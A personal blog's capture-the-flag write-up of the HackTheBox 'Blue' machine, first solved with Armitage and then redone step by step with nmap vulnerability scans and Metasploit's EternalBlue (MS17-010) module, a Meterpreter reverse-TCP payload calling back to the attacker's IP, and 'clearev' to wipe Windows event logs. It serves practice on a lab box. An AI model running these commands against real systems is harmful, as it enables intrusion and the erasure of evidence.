[Main Page](../index.html) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.html) \| [How-To Guides](../How-To Guides/HowTo-index.html) <br>


# CTF Writeup:
# Blue on HackTheBox

<br>
![A0-Logo](https://i.imgur.com/ZQYZ6mJ.png)
<br>

## 12 January 2018




## Introduction


__This write-up is broken into two sections: The process I used when I first solved this box, and my current process.
Treat part 1 as optional.__


Blue was my VERY FIRST Capture the flag, and will always be one I remember.
With no experience and minimal knowledge of Kali, I solved it using GUI tools, educated guesses and lots of clicking around.


This box serves as a showcase for what might have been the most widely known vulnerability of 2017.
It isn't the most challenging, especially with context, and might be good as your first CTF, as it was mine.


Part 2 is written with the idea that the reader has beginner knowledge of pentesting, or at least a basic idea of how Metasploit and nmap work.
I used Kali, but the tools are available for other distros and come packaged with most pentesting OS's like [BlackArch](https://blackarch.org/).
It details the process I would use today had I been attempting the CTF for the first time.


Part 1 is written more like a rambling blog post detailing my mindset and process from when I first attempted it.
It might use fewer steps than my current process, but that is because I found the box's name to be a clue big enough to shut down the British NHS.



## Part 1 - The Newbie Process


I'd been running Kali for a while, but had been using it to edit text files and get familiar with the command line - no pentesting at all.
I had weaseled my way into a Hack The Box invite code, but had never even run nmap before. Perhaps it was time to try these "Capture the Flags" for real.
Armed with Kali and all the searches the internet could provide me, I logged on to HackTheBox and went to see if I could make sense of anything I saw.


There were some IP addresses and difficulty ratings, but nothing caught my eye as a place to start.
With no idea what else to do, I attempted to place this list of machines into context.


By paying attention to Cybersecurity news (mostly by listening to the Cyberwire podcast) I had learned some interesting terms and concepts, but had no context or practical knowledge.
The big cybersecurity stories of the year so far had been WannaCry and NotPetya.
I knew Wannacry was a huge ransomware attack that was infecting Windows server machines all over the world, despite a well-known patch that had been released.
Hospitals had to divert ambulances, businesses had to shut down, and some conniving crooks out there were raking in the big bucks $300 in Bitcoin at a time.


These attacks were particularly noteworthy because of the vulnerability they exploited.
CVE-2017-0144 came to light after it was published by a group known as the Shadow Brokers.
They claimed to have stolen an exploit that took advantage of this vulnerability from the "Equation Group," which is widely believed to be the United States National Security Agency.


This secret weapon had been stolen a government cyber-armory and was placed into the hands of hackers all over the world.
Patches were released in March, but not enough systems had employed them before WannaCry burst on to the scene in May.
The exploit used in the attack was commonly known as "EternalBlue."


This is what I knew about EternalBlue at the time I sat down at HTB for the first time:
* It affected certain Windows machines (Which ones? Who knew?)
* It was called EternalBlue

That's it. I had no idea what services it exploited and  couldn't recall what access it granted.


With this information bouncing around inside my head somewhere, I looked for the CTFs with the lowest difficulty ratings.
Something clicked in my head when I saw this:

<br>
![A1](https://i.imgur.com/QoRG1NK.png)
<br>

*Blue + Windows + (current year = 2017) + Easy* = This machine must crack under EternalBlue!


Of course! This information was sure to carry me to the legendary flag I had heard needed to be captured.
I just needed to implement my strategy and it would be mine.

However, my grand revelation had not provided me an idea of *what to actually do*.
So, I began clicking around on Kali to get my bearings and looking for some kind of lead.
In the default applications dock was Armitage, and I looked it up online to find out it was a graphical front end for Metasploit.
I had heard Metasploit was very effective, but had no idea what it looked like or how it was operated.
I wondered, "if this Metasploit is so useful, surely I should be able to use it to wield EternalBlue?"


Metasploit was a mystery, but I did know how to look at graphics. Armitage seemed to be a good place to start.
I clicked all the default options upon startup and  I found myself looking at some folders, a empty void and a console.
After browsing through the options at the top of the page, I decided I might need to add a target. I went to "Hosts" and selected "Add Hosts."

<br>
![A2](https://i.imgur.com/R9fasSy.png)
<br>


I supposed I needed to enter "10.10.10.40" - the box IP

<br>
![A3](https://i.imgur.com/3MhI8xO.png)
<br>

I now had a monitor icon representing a machine. I noticed there was a search box under the folders, so I went ahead and entered "blue"

<br>
![A4](https://i.imgur.com/uuSx1g6.png)
<br>

That last result looked very promising!
I didn't know any other name for the exploit besides "EternalBlue," but the fact that there was as "17" in the title suggested this was the the exploit I needed.
I clicked on the "target" machine, then on the eternalblue line. An options Window came up, but I didn't know how to interpret any of those options, so I just hit enter.
The console buzzed to life, and the machine's icon changed.

<br>
![A5-redlightning!](https://i.imgur.com/YHT9Nj5.png)
<br>

It turned red! There was lightning! I MUST be a hacker now.
Had I just used an NSA secret weapon? __*Woooooaaaaaaaah.*__



I didn't know how to move forward, so I attempted my tried and true method: clicking on things until something happened.
I struck gold when I right-clicked the box icon and saw the "Interact" option - a Windows command line appeared in the bottom console.

<br>
![A6-Console](https://i.imgur.com/J2usYNe.png)
<br>

At this time, I could stumble around the Linux command line with some effectiveness, but in Windows I was fumbling around in the dark.
All I knew was `cd` , `dir` which proved to be just barely enough to get around, albeit slowly.


* `cd ..`
* `cd ..`
* `dir`
* `cd Users`
* `dir`

<br>
![A7-users](https://i.imgur.com/AcombN2.png)
<br>


I knew that I had to capture the "System" and "User" flags - so I assumed "haris" was the user, and "Administrator" was the path that lead to the system flag.

* `cd Administrator`
* `cd Desktop`
* `dir`


At this point, I knew I had to read the file, but `cat` didn't work! My windows command line knowledge had been depleted!
A quick online search lead me to `type` and my first flag was captured!

* `type root.txt.txt`

<br>
![A8-admin](https://i.imgur.com/tADNwpx.png)
<br>

It was very exciting, and I immediately set out on the next boxes, stumbling along into new knowledge.


## Part 2 - A More Current Strategy


It hasn't been very long since I captured that flag the first time, but my process has changed dramatically.
That time has been spent learning and practicing, and I have even developed something of a methodology.
Here is how I would attempt the box today, with a bit more experience under my belt.


"Blue" still provides some context, HackTheBox boxes don't provide an exceptionally high amount of information ahead of time.
A good scan is in order.


`nmap -sV -F -T4 10.10.10.40 -oA nmap_fast_scan`

<br>
![A9 - nmap quickscan](https://i.imgur.com/8DEdi44.png)
<br>


Most of the CTF's I have done so far revolve around a HTTP port, and aren't Windows machines, so I am a bit out of my element.
I should try to get more information - some deeper `nmap` scanning should help with this.


`nmap -sV -sC --script=vuln  10.10.10.40 -oA nmap_fullscan_blue`

While this is running, I'll search for some information about possible vulnerabilities based on the information I do have.


I tried Findsploit, but didn't find anything too interesting. These ports are pretty unfamiliar to me, so I'll do some research about what I am dealing with.
Research on the rpc port reminds me that I can use the `enum4linux` tool


`enum4linux 10.10.10.40`


This command mostly informed me that the scanned ports were off-limits.
It doesn't seem like a way to move forward. The same was true for `nbtscan` and `smbmap`.


Without the context of "Blue" - this box didn't provide me much I recognized.
Even though I did know that the box was named Blue, I decided to pretend that I had never heard of the exploit I new I needed.
This way I can test my process and see if I would "discover" the exploit I needed.


While I had been searching for information about the ports and not finding anything to grab on to, `nmap` finished the deeper scan.
It produced a very, very interesting result.

<br>
![A10](https://i.imgur.com/uF7fah7.png)
<br>

What is this mysterious "ms17-010" of which it speaks?
Maybe [Findsploit](https://github.com/1N3/Findsploit) has something about this? Remote Code Execution is exactly what I'd like to have.

<br>
![A11](https://i.imgur.com/YsYQzpf.png)
<br>

How convenient: Metasploit has both a scanning and exploitation module for this vulnerability.


* `msfconsole`
* `use auxiliary/scanner/smb/smb_ms17_010`
* `set RHOSTS 10.10.10.40`
* `run`

<br>
![A12](https://i.imgur.com/GHE0YIK.png)
<br>

The scanning module reports that we have a decent chance of success if we run the exploit, so let's do it.


`* use exploit/windows/smb/ms17_010_eternalblue`

"EternalBlue," eh? Maybe that is how the box got its name. Hmm...


`show options`


As of this writing, I am still pretty green when it comes to the Windows command line. To circumvent this issue, let's make sure our payload is Meterpreter.


`set PAYLOAD windows/x64/meterpreter/reverse_tcp`


Make sure your Meterpreter IP is set to your HTB VPN IP


* `set LHOST 10.10.14.10`
* `set RHOST 10.10.10.40`
* `run`

<br>
![A13](https://i.imgur.com/0u72HoI.png)
<br>

Once again, it is just really cool to know that you've used an NSA cyberweapon!

* `getuid`


getuid tells us we are the boss of this system, and can go ahead and grab whatever flags we wish.


* `cd /Users/Administrator/Desktop`
* `ls`
* `cat root.txt.txt`

<br>
![A14](https://i.imgur.com/MvYcrvu.png)
<br>

* `ls /Users`


`haris` appears to be the name of our flag-holding user.


* `cd /Users/haris/Desktop`
* `ls`
* `cat user.txt.txt`

<br>
![A15](https://i.imgur.com/5rQZySt.png)
<br>

Now, all that is left to do is clean up using the built-in meterpreter methods.

* `clearev`


Thanks to HackTheBox for making such an approachable and timely CTF!


<br>
[Main Page](../index.html) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.html) \| [How-To Guides](../How-To Guides/HowTo-index.html) <br>
